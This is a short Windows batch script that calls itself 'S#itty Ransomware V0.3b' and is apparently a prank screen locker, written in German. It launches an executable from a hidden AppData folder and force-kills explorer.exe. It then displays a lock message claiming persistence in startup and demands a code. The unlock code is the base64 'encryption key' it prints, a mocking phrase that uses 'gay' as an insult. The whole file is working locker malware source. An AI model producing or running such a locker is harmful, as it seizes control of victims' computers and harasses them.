@echo off
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\KILLV1.exe
taskkill /f /im explorer.exe
title S#itty Ransomware V0.3b
color 6
cls
goto :text2

:text
cls
echo Falscher Code!

:text2
echo.
echo sorry, PC ist wiedermal gesperrt.
echo diesmal aber etwas strenger und besserem code.
echo PC ist immernoch net encrypted weil (immernoch)
echo zu viel Arbeit.
echo Das Program ist immernoch im startup drinne :D
echo Code ist nicht von Alex. (ausnahmsweise)
echo Der Encryption Key ist NICHT der Decryption Code
echo /J
echo.
echo dein Encryption-Key: 
echo Z2F5QXp1Ymk0TGlmZQ==
echo.
echo.
echo Decryption-Code Eingabe:
set /p input=">>>":
if "%input%" == "gayAzubi4Life" goto :end
if "%input%" == "debug();" goto dev:
goto :text

:end
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\cleaner.bat
exit

:dev
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\debug.bat
cls
goto :text2